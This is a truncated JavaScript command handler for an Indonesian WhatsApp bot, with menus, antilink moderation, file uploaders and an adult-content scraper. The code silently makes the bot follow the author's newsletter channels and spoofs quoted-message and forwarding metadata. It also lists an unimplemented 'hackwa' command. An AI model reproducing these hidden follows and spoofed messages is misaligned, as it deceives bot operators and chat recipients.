/*

  !- ©ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ
  https://wa.me/6288213993436
  
*/

require('../settings/config');

const { fromBuffer } = require('file-type')
let cheerio = require('cheerio')
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const BodyForm = require('form-data')
const util = require("util");
const moment = require("moment-timezone");
const path = require("path")
const os = require('os')
const JsConfuser = require('js-confuser')
const fetch = require('node-fetch');
const yts = require('yt-search');
const { getVideoInfo, downloadVideo, downloadAudio } =require("hybrid-ytdl");
const crypto = require('crypto');
const { Sticker } = require('wa-sticker-formatter')
const { SnackVideo } = require('../start/lib/function/snackvideo')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { pinterest, pinterest2, remini, mediafire, tiktokDl } = require('./lib/scraper');
const {
    spawn, 
    exec,
    execSync 
   } = require('child_process');
   const getFileSizeFromUrl = async (url) => {
    try {
        let response = await fetch(url, { method: 'HEAD' });
        return response.headers.get('content-length') || 0;
    } catch (err) {
        console.error('Error fetching file size:', err);
        return 0;
    }
};


const { makeWASocket, makeCacheableSignalKeyStore, downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, PHONENUMBER_MCC, AnyMessageContent, useMultiFileAuthState, fetchLatestBaileysVersion, templateMessage, InteractiveMessage, Header } = require('@whiskeysockets/baileys')

module.exports = Denzy = async (Denzy, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : "");
        const sender = m.key.fromMe ? Denzy.user.id.split(":")[0] + "@s.whatsapp.net" || Denzy.user.id
: m.key.participant || m.key.remoteJid;

        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];
        
        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const premium = JSON.parse(fs.readFileSync("./start/lib/database/premium.json"))
        const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));
        const owners = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'))
        const antilink = JSON.parse(fs.readFileSync('./command/antilink.json'))
        const antilink2 = JSON.parse(fs.readFileSync('./command/antilink2.json'))
        const Antilinkall = JSON.parse(fs.readFileSync('./command/antilinkall.json'))
        const botNumber = await Denzy.decodeJid(Denzy.user.id);
        const isDenzyCreator = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = premium.includes(m.sender)
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const isOwner = owners.includes(sender)
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const Creator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        
        const groupMetadata = m.isGroup ? await Denzy.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const froms = m.quoted ? m.quoted.sender : text ? (text.replace(/[^0-9]/g, '') ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false) : false;
        
const qtext = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${prefix+command}`}}}

const qtext2 = {key: {remoteJid: "status@broadcast", participant: "0@s.whatsapp.net"}, message: {"extendedTextMessage": {"text": `${namafile}`}}}
        const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${nama}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6282278097863:+6282278097863\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
const Reply = (teks) => {
Denzy.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 999,
isForwarded: true,
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": `${global.nama}`,
"body": `${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
"sourceUrl": 'https://whatsapp.com/channel/0029VbAlvk9Fsn0boxiHJX0H'}}},
{ quoted: qkontak})
}
        const reply = (teks) => {
Denzy.sendMessage(m.chat, { text: teks, contextInfo: {
            mentionedJid: [],
            groupMentions: [],
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363377429302268@newsletter',
               newsletterName: "ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ",
                serverMessageId: -1
            },
            forwardingScore: 256,
externalAdReply: {
        showAdAttribution: true,
        title: `ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ`,
        body: `Mau Script? Klik Gambar Ini :3`,
        thumbnailUrl: `https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg`,
        sourceUrl: "https://www.youtube.com/@rizeldev",
        mediaType: 1,
        renderLargerThumbnail: false
          }
        }}, { quoted: qkontak })}
        const Denzyadmn = () => {
        let DenzyStikRep = fs.readFileSync('./start/lib/sticker_reply/admin.webp')
        Denzy.sendMessage(from, { sticker: DenzyStikRep }, { quoted: m })
        }
        const Denzybotadmin = () => {
        let DenzyStikRep = fs.readFileSync('./start/lib/sticker_reply/botadmin.webp')
        Denzy.sendMessage(from, { sticker: DenzyStikRep }, { quoted: m })
        }
        const Denzyowner = () => {
        let DenzyStikRep = fs.readFileSync('./start/lib/sticker_reply/owner.webp')
        Denzy.sendMessage(from, { sticker: DenzyStikRep }, { quoted: m })
        }
        const Denzyongb = () => {
        let DenzyStikRep = fs.readFileSync('./start/lib/sticker_reply/group.webp')
        Denzy.sendMessage(from, { sticker: DenzyStikRep }, { quoted: m })
        }
        const Denzypriv = () => {
        let DenzyStikRep = fs.readFileSync('./start/lib/sticker_reply/prem.webp')
        Denzy.sendMessage(from, { sticker: DenzyStikRep }, { quoted: m })
        }
        const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
}
function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
async function getBuffer(url) {
    const res = await axios.get(url, { responseType: 'arraybuffer' });
    return Buffer.from(res.data);
}
async function sendDenzyMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await Denzy.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
Denzy.newsletterFollow("120363377429302268@newsletter");
Denzy.newsletterFollow("120363416316390074@newsletter");
if (antilink.includes(m.chat)) {
if (!isBotAdmins) return
if (!isAdmins && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Denzy.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Denzy.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./Denzy.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Denzy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await Denzy.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

if (antilink2.includes(m.chat)) {
if (!isBotAdmins) return
if (!isAdmins && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await Denzy.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await Denzy.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./Denzy.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await Denzy.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}
if (Antilinkall.includes(m.chat)) {
if (!isBotAdmins) return
if (!isAdmins && !m.fromMe) {
   if (budy.includes("https://")){
if (!isBotAdmins) return
bvl = `\`\`\`「 Link Detected 」\`\`\`\n\n Admin kirim link,\n Admin mah bebas cuy 🗿☕`
if (isAdmins) return reply(bvl)
if (m.key.fromMe) return reply(bvl)
if (isDenzyCreator) return reply(bvl)
        await Denzy.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			
Denzy.sendMessage(from, {text:`\`\`\`「 Tautan Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} telah mengirimkan tautan dan berhasil dihapus`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
}
}
async function UploadFileUgu (input) {
	return new Promise (async (resolve, reject) => {
			const form = new BodyForm();
			form.append("files[]", fs.createReadStream(input))
			await axios({
				url: "https://uguu.se/upload.php",
				method: "POST",
				headers: {
					"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
					...form.getHeaders()
				},
				data: form
			}).then((data) => {
				resolve(data.data.files[0])
			}).catch((err) => reject(err))
	})
}
const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
        async function hentaivid() {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 1153)
        axios.get('https://sfmcompile.club/page/'+page)
        .then((data) => {
            const $ = cheerio.load(data.data)
            const hasil = []
            $('#primary > div > div > ul > li > article').each(function (a, b) {
hasil.push({
title: $(b).find('header > h2').text(),
link: $(b).find('header > h2 > a').attr('href'),
category: $(b).find('header > div.entry-before-title > span > span').text().replace('in ', ''),
share_count: $(b).find('header > div.entry-after-title > p > span.entry-shares').text(),
views_count: $(b).find('header > div.entry-after-title > p > span.entry-views').text(),
type: $(b).find('source').attr('type') || 'image/jpeg',
video_1: $(b).find('source').attr('src') || $(b).find('img').attr('data-src'),
video_2: $(b).find('video > a').attr('href') || ''
})
            })
            resolve(hasil)
        })
    })
}	
  const {
            smsg,
            fetchJson, 
            sleep,
            formatSize
            } = require('./lib/myfunction');
    
        let cihuy = fs.readFileSync('./start/lib/media/Denzy.jpg')
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#ff00ff").black(
                   `   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ⌬ Pesan: ${m.body || m.mtype} \n` +
                    `   ⌬ Pengirim: ${pushname} \n` +
                    `   ⌬ JID: ${sender}`
                )
            );
            
            if (m.isGroup) {
                console.log(
                    chalk.bgHex("#ff00ff").black(
                        `   ⌬ GroupJid: ${m.chat}`
                    )
                );
            }
            console.log();
        }
        const reaction = async (jidss, emoji) => {
            Denzy.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
        
         
        
        async function loading() {
    return reply("Sedang memuat Wak...");
}
async function CatBox(filePath) {
	try {
		const fileStream = fs.createReadStream(filePath);
		const formData = new BodyForm();
		formData.append('fileToUpload', fileStream);
		formData.append('reqtype', 'fileupload');
		formData.append('userhash', '');
		const response = await axios.post('https://catbox.moe/user/api.php', formData, {
			headers: {
				...formData.getHeaders(),
			},
		});
		return response.data;
	} catch (error) {
		console.error("Error at Catbox uploader:", error);
		return "Terjadi kesalahan saat upload ke Catbox.";
	}
};
if (budy.match(`jxjddjdif894`)) {
Reply(`*JANGAN TAG AYANG GW PUQI*`)
}
        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "../command"));
        const plug = { Denzy, prefix, command, reply, text, isDenzyCreator, reaction, isGroup: m.isGroup, isPrivate: !m.isGroup, pushname, mime, quoted };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.owner && !isDenzyCreator) {
                    return Denzypriv();
                }
                
                if (plugin.group && !plug.isGroup) {
                    return m.Reply("Only Grup");
                }
                
                if (plugin.private && !plug.isPrivate) {
                    return Denzypriv();
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
          const lol2 = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: null,
      itemCount: "9741",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `Sender : @${m.sender.split('@')[0]}\nCommand : ${command}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}

        
        if (!pluginsDisable) return;  
        switch (command) {
        case "menu": {
        let menu = `* ${pushname}.*   *${botname}*, 


┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ\` ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ : *${pushname}* 
║◦ɴᴀᴍᴇ ᴏᴡɴᴇʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━

┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ: *${botname}*  
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${ownername}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━ `
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                },                
                {
                  title: 'OWNER MENU',
                  id: '.ownermenu'
                },                
                {
                  title: 'ANIME MENU',
                  id: '.animemenu'
                  },                
                {
                  title: 'PUSH MENU',
                  id: '.pushmenu'
                },                
                               
                {
                  title: 'DOWNLOAD MENU',
                  id: '.downloadmenu'
                },                
                {
                  title: 'GROUP MENU',
                  id: '.groupmenu'
                  },                
                {
                title: 'ASUPAN MENU',
                  id: '.asupanmenu'
                  },                
                {
                  title: 'VOICE MENU',
                  id: '.voicemenu'
                },                
                {
                  title: 'FUN MENU',
                  id: '.funmenu'
                  },                
                {
                  title: 'OTHERMENU',
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
    headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "us mods",
      newsletterJid: `120363417769859412@newsletterr`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
            }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break
        case "ownermenu": {
        let menu = `* ${pushname}.*   *${botname}*, 


┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ\` ━━
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${pushname}* 
║◦ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━
┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ: *${botname}*  
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${ownername}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━
┏═━ [\`ᴏᴡɴᴇʀ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴄʀᴇᴀᴛᴇsᴄ
║➜ ${prefix}sᴇᴛᴛʜᴜᴍʙ
║➜ ${prefix}ᴍᴏᴅᴇ  
║➜ ${prefix}ᴀᴅᴅᴘʀᴇᴍ
║➜ ${prefix}ᴅᴇʟᴘʀᴇᴍ
║➜ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ
║➜ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ
║➜ ${prefix}ᴜᴘᴄʜ
║➜ ${prefix}ʜᴀᴄᴋᴡᴀ
║➜ ${prefix}ᴜᴘsᴡ
┗━━━━━━━⭑
━─━─━─━─━─━─━─━─━
\`© us mods 2022-2025\` `
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                },                
                {
                  title: 'OWNER MENU',
                  id: '.ownermenu'
                },                
                {
                  title: 'ANIME MENU',
                  id: '.animemenu'
                  },                
                {
                  title: 'PUSH MENU',
                  id: '.pushmenu'
                },                
                         
                {
                  title: 'DOWNLOAD MENU',
                  id: '.downloadmenu'
                },                
                {
                  title: 'GROUP MENU',
                  id: '.groupmenu'
                  },                
                {
                title: 'ASUPAN MENU',
                  id: '.asupanmenu'
                  },                
                {
                  title: 'VOICE MENU',
                  id: '.voicemenu'
                },                
                {
                  title: 'FUN MENU',
                  id: '.funmenu'
                  },                
                {
                  title: 'OTHERMENU',
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "us mods",
      newsletterJid: `120363417769859412@newsletterr`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
            }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break

 case "groupmenu": {
        let menu = `*shname}.*   *${botname}*, 







┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ\` ━━
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${pushname}* 
║◦ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━
┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ: *${botname}*  
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${ownername}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━
┏═━ [\`ɢʀᴏᴜᴘ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴡᴇʟᴄᴏᴍᴇ  
║➜ ${prefix}ᴛᴀɢᴀʟʟ  
║➜ ${prefix}ʜɪᴅᴇᴛᴀɢ  
║➜ ${prefix}ᴀɴᴛɪʟɪɴᴋ
║➜ ${prefix}ᴀɴᴛɪʟɪɴᴋ2  
║➜ ${prefix}ᴀɴᴛɪʟɪɴᴋᴀʟʟ  
║➜ ${prefix}ɪɴᴠɪᴛᴇ  
║➜ ${prefix}ᴋɪᴄᴋ  
║➜ ${prefix}ᴅᴇʟᴇᴛᴇᴘᴘɢᴄ  
║➜ ${prefix}ᴅᴇʟᴘᴘɢᴄ  
║➜ ${prefix}ᴅᴇʟᴇᴛᴇᴘᴘɢʀᴏᴜᴘ  
║➜ ${prefix}sᴇᴛɢʀᴏᴜᴘᴘᴘ  
║➜ ${prefix}sᴇᴛɢᴄᴘᴘ  
║➜ ${prefix}sᴇᴛᴘᴘɢʀᴏᴜᴘ  
║➜ ${prefix}ɢᴇᴛᴘᴘ  
║➜ ${prefix}sᴇᴛᴅᴇsᴋ  
║➜ ${prefix}sᴇᴛᴅᴇsᴄ  
║➜ ${prefix}sᴇᴛsᴜʙᴊᴇᴄᴛ  
║➜ ${prefix}sᴇᴛɢʀᴏᴜᴘɴᴀᴍᴇ  
║➜ ${prefix}sᴇᴛɴᴀᴍᴇɢᴄ  
║➜ ${prefix}ᴘʀᴏᴍᴏᴛᴇ  
║➜ ${prefix}ᴅᴇᴍᴏᴛᴇ  
┗━━━━━━━⭑

━─━─━─━─━─━─━─━─━
\`ᴜsᴍᴀɴ ᴄʜᴀᴄʜᴀʀ \``
Denzy.sendMessage(m.chat, {
  footer: foother,
  buttons: [
    {
      buttonId: `.owner`,
      buttonText: { displayText: 'Contact Owner' },
      type: 1
    },
    {
    buttonId: `.tqto`,
      buttonText: { displayText: 'Thanks To' },
      type: 1
    },
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Select This Menu',
          sections: [
            {
              title: 'Select This Menu',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'ALL MENU',
                  id: '.allmenu'
                },                
                {
                  title: 'OWNER MENU',
                  id: '.ownermenu'
                },                
                {
                  title: 'ANIME MENU',
                  id: '.animemenu'
                  },                
                {
                  title: 'PUSH MENU',
                  id: '.pushmenu'
                },                
                         
                {
                  title: 'DOWNLOAD MENU',
                  id: '.downloadmenu'
                },                
                {
                  title: 'GROUP MENU',
                  id: '.groupmenu'
                  },                
                {
                title: 'ASUPAN MENU',
                  id: '.asupanmenu'
                  },                
                {
                  title: 'VOICE MENU',
                  id: '.voicemenu'
                },                
                {
                  title: 'FUN MENU',
                  id: '.funmenu'
                  },                
                {
                  title: 'OTHERMENU',
                  id: '.othermenu'
                }
              ]
            }
          ]
        })
      }
      }
  ],
    headerType: 1,
  viewOnce: true,
       image: { url: thumbnail },
       caption: menu,
    contextInfo: {
      mentionedJid: [m.sender],
      forwardingScore: 999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
      newsletterName: "us mods",
      newsletterJid: `120363417769859412@newsletterr`,
            },
      externalAdReply: {
        showAdAttribution: true, 
        title: namaBot,
        body: namafile,
        thumbnailUrl: 'https://i.ibb.co/d0XZLt4K/IMG-20250511-002924-317.jpg',
        sourceUrl: ch,
        mediaType: 1,
        renderLargerThumbnail: false
            }
    }
    }, {
                        quoted: qkontak
                    })
                    await sleep(2500)
     Denzy.sendMessage(m.chat, {
                        audio: fs.readFileSync('./start/lib/media/menu2.mp3'),
                        mimetype: 'audio/mp4',
                        ptt: true
                    }, {
                        quoted: fvn
                    })
                    }
break
        case "downloadmenu": {
        let menu = `*shname}.*   *${botname}*, 







┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴜsᴇʀ\` ━━
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${pushname}* 
║◦ᴏᴡɴᴇʀ ɴᴜᴍʙᴇʀ : ${m.sender.split("@")[0]}
┗━━━━━━━━━━━━
┏═━ \`ɪɴғᴏʀᴍᴀᴛɪᴏɴ ʙᴏᴛ\` ━━
║◦ɴᴀᴍᴇ ʙᴏᴛ: *${botname}*  
║◦ᴏᴡɴᴇʀ ɴᴀᴍᴇ: *${ownername}*  
║◦ᴍᴏᴅᴇ: *${Denzy.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━
┏═━ [\`ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ\`] ━━
║➜ ${prefix}ᴅᴏᴡɴʟᴏᴀᴅ  
║➜ ${prefix}ᴛɪᴋᴛᴏᴋ  
║➜ ${prefix}ɪɢᴅʟ  
║➜ ${prefix}ᴘʟᴀʏ
║➜ ${prefix}ᴘʟᴀʏ2
